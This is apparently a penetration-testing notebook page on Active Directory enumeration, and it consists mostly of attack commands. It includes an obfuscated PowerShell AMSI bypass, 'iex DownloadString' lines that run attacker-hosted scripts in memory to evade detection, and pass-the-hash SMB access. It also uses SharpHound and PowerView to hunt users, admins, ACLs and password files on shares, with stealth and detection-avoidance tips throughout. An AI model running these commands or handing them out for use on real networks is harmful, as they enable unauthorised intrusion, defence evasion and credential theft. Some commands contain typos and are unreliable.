# Domain Enumeration

{% hint style="info" %}
Commands mentioned here are a combination of windows system built-in commands and automated tools.
{% endhint %}

## Enumerating with no Access / Creds

If you just have access to an AD environment but you don't have any credentials/sessions

### **Check for null and Guest Access on SMB Services**

**for old versions of windows**

```text
enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>

smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>

smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //
```

### **Enumerate LDAP**

```text
nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
```

## **Poisoning the Network**

**Assuming that you are conected to the internal network \(part of the domain\) but dont have access to any system in the domain.**

#### **check out**[ **MITM**](https://7h3w4lk3r.gitbook.io/the-hive/network-attacks/active-directory-attacks/network-poisoning-mitm) **Section.**

## Bypass AMSI

run this to bypass AMSI in the current powershell terminal that you are using:

```text
powershell -ep bypass

SET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

#### For more info about AMSI refere to the AMSI bypass in AV Evasion.

## Load scripts in Memory

To avoid signature based detection we should load our tools and scripts directly into target system mmoey:

```text
powershell -command iex (New-Object Net.WebClient).DownloadString('http://192.168.56.1/PowerView.ps1')
```

{% hint style="info" %}
In some cases windows defender will be triggered if you try to load scripts from known public sources such as github so its better if you host the script on your own machine or somewhere else.
{% endhint %}

## Load Files/Scripts on Disk

use a powershell cmdlet that acts like Linux wget command:

```text
Invoke-WebRequest -UseBasicParsing http://192.168.52.200/Tools/file.exe -OutFile file.exe -Verbose
```

## Loading Enumeration Tools

### [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

```text
# host the script & load in memory
# from powershell:
iex (New-Object Net.WebClient).DownloadString('http://192.168.56.1/PowerView.ps1')

# from cmd:
powershell -command iex (New-Object Net.WebClient).DownloadString('http://192.168.56.1/PowerView.ps1')
```

#### PowerView Cheat Sheet

![](../../.gitbook/assets/image%20%28171%29.png)

![](../../.gitbook/assets/image%20%28172%29.png)



### [ADRecon](https://github.com/sense-of-security/ADRecon)

```text
git clone https://github.com/sense-of-security/ADRecon.git

#  run ADRecon on a domain member host
.\ADRecon.ps1

# run ADRecon on a domain member host as a different user.
.\ADRecon.ps1 -DomainController <IP or FQDN> -Credential <domain\username>

# run ADRecon on a non-member host using LDAP
.\ADRecon.ps1 -Protocol LDAP -DomainController <IP or FQDN> -Credential <domain\username>

# run ADRecon with specific modules on a non-member host with RSAT. (Default OutputType is STDOUT with -Collect parameter)
.\ADRecon.ps1 -Protocol ADWS -DomainController <IP or FQDN> -Credential <domain\username> -Collect Domain, DomainControllers

# generate the ADRecon-Report.xlsx based on ADRecon output (CSV Files).
.\ADRecon.ps1 -GenExcel C:\ADRecon-Report-<timestamp>

```

#### When you run ADRecon, a `ADRecon-Report-<timestamp>` folder will be created which will contain ADRecon-Report.xlsx and CSV-Folder with the raw files.



### [Active Directory Assessment and Privilege Escalation Script](https://github.com/hausec/ADAPE-Script)

```text
powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 
```

## Domain Mapping \(Bloodhound\)

### [AzureHound](https://posts.specterops.io/introducing-bloodhound-4-0-the-azure-update-9b2b26c5e350)

```text
# require: Install-Module -name Az -AllowClobber
# require: Install-Module -name AzureADPreview -AllowClobber
Connect-AzureAD
Connect-AzAccount
. .\AzureHound.ps1
Invoke-AzureHound
```

### [BloodHound](https://github.com/BloodHoundAD/BloodHound)

```text
# run the collector on the machine using SharpHound.exe
# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
.\SharpHound.exe -c all -d active.htb -SearchForest
.\SharpHound.exe --EncryptZip --ZipFilename export.zip
.\SharpHound.exe -c all,GPOLocalGroup
.\SharpHound.exe -c all --LdapUsername <UserName> --LdapPassword <Password> --JSONFolder <PathToFile>
.\SharpHound.exe -c all -d active.htb --LdapUsername <UserName> --LdapPassword <Password> --domaincontroller 10.10.10.100
.\SharpHound.exe -c all,GPOLocalGroup --outputdirectory C:\Windows\Temp --randomizefilenames --prettyjson --nosavecache --encryptzip --collectallproperties --throttle 10000 --jitter 23


# or run the collector on the machine using Powershell
# https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
# /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1
Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
```

Then import the zip/json files into the Neo4J database and query them.

```text
root@payload$ apt install bloodhound 

# start BloodHound and the database
root@payload$ neo4j console
# or use docker
root@payload$ docker run -p7474:7474 -p7687:7687 -e NEO4J_AUTH=neo4j/bloodhound neo4j

root@payload$ ./bloodhound --no-sandbox
Go to http://127.0.0.1:7474, use db:bolt://localhost:7687, user:neo4J, pass:neo4j
```

{% hint style="info" %}
we can use the exe version without argument and get the same output. download and extract it and upload all files in bloodhound UI.
{% endhint %}

### [bloodhound - python](https://github.com/fox-it/BloodHound.py)

{% hint style="info" %}
This needs credentials but its FUD and runs remotely.
{% endhint %}

```text
pip install bloodhound
bloodhound-python -c ALL -d megacorp.local -u client1 -p password123 -ns [domain controller ip]
```

#### this will dump all domain info to the attackers machine remotely without being detected but you need to have the credentials for at least a low-privilege user in the domain.

## Domain & System Info

### Domain Info

```text
Get-NetDomain
get-netforest
get-netforestdomain
Get-DomainPolicy

#Will show us the policy configurations of the Domain about system access or kerberos
(Get-DomainPolicy)."system access"
(Get-DomainPolicy)."kerberos policy"
# or
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
```

### get domain controllers

```text
Get-NetDomainController
Get-NetDomainController -Domain <DomainName>
```

### **Enum Domain Trust**

```text
Get-NetDomainTrust
Get-NetDomainTrust -Domain <DomainName>
```

###  **Enum Forest Trust**

```text
Get-NetForestDomain
Get-NetForestDomain Forest <ForestName>

#Domains of Forest Enumeration
Get-NetForestDomain
Get-NetForestDomain Forest <ForestName>

#Map the Trust of the Forest
Get-NetForestTrust
Get-NetDomainTrust -Forest <ForestName>
```

\*\*\*\*

## Domain Computers

```text
Get-AdComputer -filter *
Get-NetComputer -FullData
Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName

#Enumerate Live machines 
Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName


```

#### Get All Computers by Name

This will list all the computers in the domain and only display the hostname

```text
Get-ADComputer -filter * | select name
```

#### Get All Computers from an OU

```text
Get-ADComputer -SearchBase "OU=DN" -Filter *
```

#### Get a Count of All Computers in Domain

```text
Get-ADComputer -filter * | measure
```

#### Get all Windows 10 Computers

Change Windows 10 to any OS you want to search for

```text
Get-ADComputer -filter {OperatingSystem -Like '*Windows 10*'} -property * | select name, operatingsystem
```

#### Get a Count of All computers by Operating System

This will provide a count of all computers and group them by the operating system. A great command to give you a quick inventory of computers in AD.

```text
Get-ADComputer -Filter "name -like '*'" -Properties operatingSystem | group -Property operatingSystem | Select Name,Count
```

#### Delete a single Computer

```text
Remove-ADComputer -Identity "USER04-SRV4"
```

#### Delete a List of Computer Accounts

Add the hostnames to a text file and run the command below.

```text
Get-Content -Path C:ComputerList.txt | Remove-ADComputer
```

#### Delete Computers From an OU

```text
Get-ADComputer -SearchBase "OU=DN" -Filter * | Remote-ADComputer
```



## Users & Groups

### **User Hunting**

```text
#Finds all machines on the current domain where the current user has local admin access
Find-LocalAdminAccess -Verbose

#Find local admins on all machines of the domain:
Invoke-EnumerateLocalAdmin -Verbose

#Find computers were a Domain Admin OR a spesified user has a session
Invoke-UserHunter
Invoke-UserHunter -GroupName "RDPUsers"
Invoke-UserHunter -Stealth

#Confirming admin access:
Invoke-UserHunter -CheckAccess
```

\*\*\*\*

### Users in the current domain

```text
Get-NetUser (Powerview)
Get-NetUser -Username student (Powerview)
Get-ADUser -Filter * -Properties * (Active Directory)
Get-ADUser -Identity student -properties * (Active Directory)
```

### User Properties

```text
Get-UserProperty (Powerview)
Get-ADUser username -Properties *
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()  (powershell)
```

### Find Local Admins

```text
find-localadminaccess -verbose
```

#### Finds which machines users of a specified group are logged into

```text
get-help Invoke-UserHunter -examples
Invoke-UserHunter
get-help Invoke-UserHunter
```

### Get admin group members

```text
get-netgroupmember -groupname 'administrators'
get-netgroupmember -groupname 'Domain Admins' -recurse
```

#### check logon count for all users in the domain

```text
get-userproperty -properties logoncount
```

### last password set time

```text
Get-UserProperty -Properties pwdlastset (Powerview)
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -Membertype *Property | select Name        (Active Directory)
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}    (Active Directory)
```

### Get Users by Name

```text
get-Aduser -Filter {name -like "*robert*"}
```

### Get All Disable User Accounts

```text
Search-ADAccount -AccountDisabled | select name
Search-ADAccount -AccountDisabled
```

Disable User Account

```text
Disable-ADAccount -Identity rallen
```

Enable User Account

```text
Enable-ADAccount -Identity rallen
```

### Stealing the SID of the krbtgt account

```text
Get-ADUser -Identity krbtgt
```

### Find All Locked User Accounts

```text
Search-ADAccount -LockedOut
```

Unlock User Account

```text
Unlock-ADAccount –Identity john.smith
```

### Get All Accounts with Password Set to Never Expire

```text
get-aduser -filter * -properties Name, PasswordNeverExpires | where {$_.passwordNeverExpires -eq "true" } | Select-Object DistinguishedName,Name,Enabled
```

### Get all GPOs by status

```text
get-GPO -all | select DisplayName, gpostatus
```

### Listing the group members of group

```text
Get-ADGroupMember -Identity [group name ]
```

Get All members Of A Security group

```text
Get-ADGroupMember -identity “HR Full”
```

Get Group by keyword

```text
get-adgroup -filter * | Where-Object {$_.name -like "*group-name*"}
```

Get all the groups in the current domain PowerView

```text
Get-NetGroup
Get-NetGroup *admin*
```

### **Enum Group Policies**

```text
Get-NetGPO

# Shows active Policy on specified machine
Get-NetGPO -ComputerName <Name of the PC>
Get-NetGPOGroup

#Get users that are part of a Machine's local Admin group
Find-GPOComputerAdmin -ComputerName <ComputerName>
```

others options:

```text
#Get a spesific "string" on a user's attribute
Find-UserField -SearchField Description -SearchTerm "wtver"

#Enumerate user logged on a machine
Get-NetLoggedon -ComputerName <ComputerName>

#Enumerate Session Information for a machine
Get-NetSession -ComputerName <ComputerName>

#Enumerate domain machines of the current/specified domain where specific users are logged into
Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
```

## **Enum OUs**

```text
Get-NetOU -FullData 
Get-NetGPO -GPOname <The GUID of the GPO>
```

### \*\*\*\*

## **Enum ACLs**

```text
# Returns the ACLs associated with the specified account
Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose

#Search for interesting ACEs
Invoke-ACLScanner -ResolveGUIDs

#Check the ACLs associated with a specified path (e.g smb share)
Get-PathAcl -Path "\\Path\Of\A\Share"


```

### Get ACLs associated with the specified object

```text
Get-ObjectACL -SamAccountName user123 -ResolveGUIDs
```

### Get ACLs associated with the specified prefix to be used for search

```text
Get-objectACL -ADSprefix 'CN=Administrator,CN=Users' -Verbose
```

### GenericWrite 

```text
Get-ObjectAcl -SamAccountName * –ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603') }
```



## **Enum Shares**

#### from outside:

```text
smbmap -H 10.10.10.100    # null session
smbmap -H 10.10.10.100 -R # recursive listing
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18


smbclient -I 10.10.10.100 -L ACTIVE -N -U ""
use Sharename # select a Sharename
cd Folder     # move inside a folder
ls            # list files


pth-smbclient -U "AD/ADMINISTRATOR%aad3b435b51404eeaad3b435b51404ee:2[...]A" //192.168.10.100/Share
ls  # list files
cd  # move inside a folder
get # download files
put # replace a file
```

Mount a share

```text
smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
```

#### from inside:

```text
get-netshare
get-dfsshare
get-netfileserver

#Enumerate Domain Shares
Find-DomainShare

#Enumerate Domain Shares the current user has access
Find-DomainShare -CheckShareAccess

#Enumerate "Interesting" Files on accessible shares
Find-InterestingDomainShareFile -Include *passwords*

```

















